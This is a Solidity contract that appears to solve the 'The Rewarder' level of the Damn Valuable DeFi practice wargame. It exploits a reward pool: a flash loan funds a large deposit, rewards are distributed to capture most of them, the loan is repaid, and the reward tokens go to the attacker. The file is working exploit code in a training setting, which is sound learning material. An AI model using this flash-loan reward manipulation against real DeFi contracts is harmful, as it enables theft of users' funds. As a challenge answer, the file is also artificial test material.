// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface FlashloanPoolInterface {
	function flashLoan(uint256 amount) external;
}

interface TheRewarderPoolInterface {
	function deposit(uint256 amountToDeposit) external;
	function withdraw(uint256 amountToWithdraw) external;
	function distributeRewards() external;
}

contract CustomTheRewarder {
	
    using Address for address payable;

    address payable private pool;
	address private owner;
	
    FlashloanPoolInterface public pool_contract;
    TheRewarderPoolInterface public rewarder_contract;
	
	IERC20 public DamnValuableToken;
	IERC20 public RewardsToken;

    constructor(address payable poolAddress, address payable rewarderPoolAddress, address payable damnValuableTokenAddress, address payable rewardsTokenAddress) {
        pool_contract = FlashloanPoolInterface(poolAddress);
		rewarder_contract = TheRewarderPoolInterface(rewarderPoolAddress);
		DamnValuableToken = IERC20(damnValuableTokenAddress);
		RewardsToken = IERC20(rewardsTokenAddress);
		owner = msg.sender;
    }
	
	
    // Function called by the pool during flash loan
    function receiveFlashLoan(uint256 amount) external payable {
		
		console.log("Flashloan Received");
		
		// Approve ERC-20 token so the rewarder_contract can use TransferFrom function successfully
		DamnValuableToken.approve(address(rewarder_contract), amount);
		
		// Call the deposit function which will use TransferFrom function to transfer the tokens from THIS contract
		rewarder_contract.deposit(amount);
		
		console.log("Tokens successfully transferred to rewarder contract");
		
		// Since we have the highest pool of tokens, we get the most rewards
		rewarder_contract.distributeRewards();
		
		// Withdrawing reward tokens from reward contract
		rewarder_contract.withdraw(amount);
		
		console.log("Reward tokens successfully withdrawn");
		
		// transfer rewards to attacker so the test will pass
		uint tokenBalance = RewardsToken.balanceOf(address(this));
		RewardsToken.transfer(owner, tokenBalance);
		
		// payback flashloan
		DamnValuableToken.transfer(msg.sender, amount);
		
    }
	
	function attack() external {
		
        pool_contract.flashLoan(1000000 ether); 
		
    }

    receive () external payable {}
	
}